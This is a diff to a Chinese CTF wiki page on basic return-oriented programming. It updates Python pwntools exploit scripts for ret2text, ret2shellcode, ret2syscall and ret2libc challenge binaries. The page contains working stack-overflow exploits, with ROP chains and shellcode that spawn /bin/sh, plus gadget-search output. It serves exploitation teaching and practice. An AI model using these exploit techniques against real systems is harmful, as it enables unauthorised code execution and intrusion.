@@ -1,4 +1,6 @@
 [EN](./basic-rop.md) | [ZH](./basic-rop-zh.md)
+
+
 # 基本 ROP
 
 随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段( gadgets )来改变某些寄存器或者变量的值，从而控制程序的执行流程。**所谓gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。
@@ -28,7 +30,7 @@ ret2text 即控制程序执行程序本身已有的的代码(.text)。其实，�
 首先，查看一下程序的保护机制
 
 ```shell
-➜  ret2text checksec ret2text
+$ checksec ret2text
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
@@ -117,13 +119,31 @@ $eip   : 0x080486ae  →  <main+102> call 0x8048460 <gets@plt>
 最后的 payload 如下：
 
 ```python
-##!/usr/bin/env python
+#!/usr/bin/env python3
 from pwn import *
 
-sh = process('./ret2text')
-target = 0x804863a
-sh.sendline('A' * (0x6c+4) + p32(target))
-sh.interactive()
+#--------setup--------#
+
+context(arch="i386", os="linux")
+
+elf = ELF("ret2text")
+p = elf.process()
+
+#--------ret2text--------#
+
+offset = 112
+# <secure+61>: skip the rand() check
+secure = elf.sym["secure"] + 61
+print(hex(secure))
+
+payload = flat(
+    b"A" * offset,
+    secure,
+
+)
+
+p.sendlineafter("do you know anything?\n", payload)
+p.interactive()
 ```
 
 ## ret2shellcode
@@ -143,7 +163,7 @@ ret2shellcode，即控制程序执行 shellcode代码。shellcode 指的是用�
 首先检测程序开启的保护
 
 ```shell
-➜  ret2shellcode checksec ret2shellcode
+$ checksec ret2shellcode
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
@@ -226,20 +246,34 @@ Start      End        Offset     Perm Path
 具体的 payload 如下
 
 ```python
-#!/usr/bin/env python
+#!/usr/bin/env python3
 from pwn import *
 
-sh = process('./ret2shellcode')
-shellcode = asm(shellcraft.sh())
-buf2_addr = 0x804a080
+#--------setup--------#
 
-sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
-sh.interactive()
+context(arch="i386", os="linux")
+
+elf = ELF("ret2shellcode")
+p = elf.process()
+
+#--------ret2shellcode--------#
+
+offset = 112
+shellcode = asm(shellcraft.sh())
+buf2 = 0x0804A080
+
+payload = flat(
+    shellcode.ljust(offset, b"\x00"),
+    buf2,
+)
+
+p.sendlineafter("No system for you this time !!!\n", payload)
+p.interactive()
 ```
 
 ### 题目
 
-- sniperoj-pwn100-shellcode-x86-64
+- [sniperoj-pwn100-shellcode-x86-64](https://raw.githubusercontent.com/SniperOJ/CDN/master/pwn/shorter-shellcode-x86-64)
 
 ## ret2syscall
 
@@ -256,7 +290,7 @@ ret2syscall，即控制程序执行系统调用，获取 shell。
 首先检测程序开启的保护
 
 ```shell
-➜  ret2syscall checksec rop
+$ checksec rop
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
@@ -302,7 +336,7 @@ execve("/bin/sh",NULL,NULL)
 首先，我们来寻找控制 eax 的gadgets
 
 ```shell
-➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
+$ ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
 0x080bb196 : pop eax ; ret
 0x0807217a : pop eax ; ret 0x80e
@@ -310,12 +344,12 @@ execve("/bin/sh",NULL,NULL)
 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
 ```
 
-可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。
+可以看到有上述几个都可以控制 eax，可以选取第二个来作为 gadgets。
 
 类似的，我们可以得到控制其它寄存器的 gadgets
 
 ```shell
-➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
+$ ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
 0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
 0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
@@ -345,7 +379,7 @@ execve("/bin/sh",NULL,NULL)
 0x0807b6ed : pop ss ; pop ebx ; ret
 ```
 
-这里，我选择
+这里可以选择：
 
 ```text
 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
@@ -356,7 +390,7 @@ execve("/bin/sh",NULL,NULL)
 此外，我们需要获得 /bin/sh 字符串对应的地址。
 
 ```shell
-➜  ret2syscall ROPgadget --binary rop  --string '/bin/sh' 
+$ ROPgadget --binary rop  --string '/bin/sh' 
 Strings information
 ============================================================
 0x080be408 : /bin/sh
@@ -365,7 +399,7 @@ Strings information
 可以找到对应的地址，此外，还有 int 0x80 的地址，如下
 
 ```text
-➜  ret2syscall ROPgadget --binary rop  --only 'int'                 
+$ ROPgadget --binary rop  --only 'int'                 
 Gadgets information
 ============================================================
 0x08049421 : int 0x80
@@ -381,22 +415,42 @@ Unique gadgets found: 4
 下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。
 
 ```python
-#!/usr/bin/env python
+#!/usr/bin/env python3
 from pwn import *
 
-sh = process('./rop')
+#--------setup--------#
 
-pop_eax_ret = 0x080bb196
-pop_edx_ecx_ebx_ret = 0x0806eb90
+context(arch="i386", os="linux")
+
+elf = ELF("rop")
+p = elf.process()
+
+#--------ret2syscall--------#
+
+offset = 112
+# ROPgadget --binary rop --only "pop|ret" | grep eax
+pop_eax = 0x080bb196
+# ROPgadget --binary rop --string "/bin/sh"
+bin_sh = 0x080be408
+# ROPgadget --binary rop --only "pop|ret" | grep ecx
+pop_edx_ecx_ebx = 0x0806eb90
+# ROPgadget --binary rop --only "int"
 int_0x80 = 0x08049421
-binsh = 0x80be408
+
 payload = flat(
-    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
-sh.sendline(payload)
-sh.interactive()
+    b"A" * offset,
+    pop_eax, 0xb,
+    pop_edx_ecx_ebx, 0, 0, bin_sh,
+    int_0x80, # syscall
+)
+
+p.sendlineafter("What do you plan to do?\n", payload)
+p.interactive()
 ```
 
 ### 题目
+
+- [rain.cs.nctu.edu.tw: rop](https://bamboofox.cs.nctu.edu.tw/courses/1/challenges/4)
 
 ## ret2libc
 
@@ -417,7 +471,7 @@ ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个�
 首先，我们可以检查一下程序的安全保护
 
 ```shell
-➜  ret2libc1 checksec ret2libc1    
+$ checksec ret2libc1    
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
@@ -443,7 +497,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在
 
 ```shell
-➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          
+$ ROPgadget --binary ret2libc1 --string '/bin/sh'          
 Strings information
 ============================================================
 0x08048720 : /bin/sh
@@ -458,20 +512,35 @@ Strings information
 那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下
 
 ```python
-#!/usr/bin/env python
+#!/usr/bin/env python3
 from pwn import *
 
-sh = process('./ret2libc1')
+#--------setup--------#
 
-binsh_addr = 0x8048720
-system_plt = 0x08048460
-payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])
-sh.sendline(payload)
+context(arch="i386", os="linux")
 
-sh.interactive()
+elf = ELF("ret2libc1")
+p = elf.process()
+
+#--------ret2system--------#
+
+offset = 112
+system = elf.sym["system"]
+# ROPgadget --binary ret2libc1 --string "/bin/sh"
+bin_sh = 0x08048720
+
+payload = flat(
+    b"A" * offset,
+    system,
+    b"B" * 4, # ret addr for system
+    bin_sh, # arg for system
+)
+
+p.sendlineafter("RET2LIBC >_<\n", payload)
+p.interactive()
 ```
 
-这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以 'bbbb' 作为虚假的地址，其后参数对应的参数内容。
+这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以 "BBBB" 作为虚假的地址，其后参数对应的参数内容。
 
 这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。
 
@@ -484,23 +553,53 @@ sh.interactive()
 该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system("/bin/sh")。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下
 
 ```python
-##!/usr/bin/env python
+#!/usr/bin/env python3
 from pwn import *
 
-sh = process('./ret2libc2')
+#--------setup--------#
 
-gets_plt = 0x08048460
-system_plt = 0x08048490
+context(arch="i386", os="linux")
+
+elf = ELF("ret2libc2")
+p = elf.process()
+
+#--------ret2libc--------#
+
+offset = 112
+gets_plt = elf.plt["gets"]
+# ROPgadget --binary ret2libc2 --only "ret"
+ret = 0x08048426
+buf2 = 0x0804A080
+# ROPgadget --binary ret2libc2 --only "pop|ret"
 pop_ebx = 0x0804843d
-buf2 = 0x804a080
+system_plt = elf.plt["system"]
+buf2 = 0x0804A080
+
+# step 1: call gets(buf2) and input /bin/sh
+# step 2: call system("/bin/sh")
 payload = flat(
-    ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
-sh.sendline(payload)
-sh.sendline('/bin/sh')
-sh.interactive()
+    b"A" * offset,
+    gets_plt,
+    pop_ebx, # ret addr for gets
+    buf2, # arg for gets
+    system_plt,
+    b"B" * 4, # ret addr for system
+    buf2, # arg for system
+)
+"""
+Note that pop_ebx is used to pop buf2 off the stack
+when gets(buf2) returns. After that, system_plt is on
+the top of the stack, so the ROP chain continues.
+This is a trick used in ROP, commonly referred as
+"preparing the stack" for system("/bin/sh").
+"""
+
+p.sendlineafter("What do you think ?", payload)
+p.sendline("/bin/sh")
+p.interactive()
 ```
 
-需要注意的是，我这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。
+需要注意的是，这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。
 
 #### 例3
 
@@ -511,7 +610,7 @@ sh.interactive()
 在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护
 
 ```shell
-➜  ret2libc3 checksec ret2libc3
+$ checksec ret2libc3
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
@@ -539,7 +638,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 - system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。
 - 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而 libc 在github上有人进行收集，如下
-  - https://github.com/niklasb/libc-database
+- https://github.com/niklasb/libc-database
 
 所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system函数的地址。
 
@@ -557,7 +656,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 - 获取 libc 版本
 - 获取 system 地址与 /bin/sh 的地址
 - 再次执行源程序
-- 触发栈溢出执行 system(‘/bin/sh’)
+- 触发栈溢出执行 system("/bin/sh")
 
 exp 如下
 
@@ -589,22 +688,18 @@ payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
 sh.sendline(payload)
 
 sh.interactive()
-
 ```
 
 ### 题目
 
-- train.cs.nctu.edu.tw: ret2libc
-
-## 题目
-
-- train.cs.nctu.edu.tw: rop
-- 2013-PlaidCTF-ropasaurusrex
-- Defcon 2015 Qualifier: R0pbaby
+- [train.cs.nctu.edu.tw: ret2libc](https://bamboofox.cs.nctu.edu.tw/courses/1/challenges/7)
+- [2013-PlaidCTF-ropasaurusrex](https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby)
+- [Defcon 2015 Qualifier: R0pbaby](https://ctftime.org/task/364)
 
 ## 参考阅读
 
-- [乌云一步一步ROP篇(蒸米)](http://wooyun.jozxing.cc/static/drops/tips-6597.html)
+- [蒸米 ROP - Linux_x86](https://segmentfault.com/a/1190000005888964)
+- [蒸米 ROP - Linux_x64](https://segmentfault.com/a/1190000007406442)
 - [手把手教你栈溢出从入门到放弃（上）](https://zhuanlan.zhihu.com/p/25816426)
 - [手把手教你栈溢出从入门到放弃（下）](https://zhuanlan.zhihu.com/p/25892385)
 - [ 【技术分享】现代栈溢出利用技术基础：ROP](http://bobao.360.cn/learning/detail/3694.html)
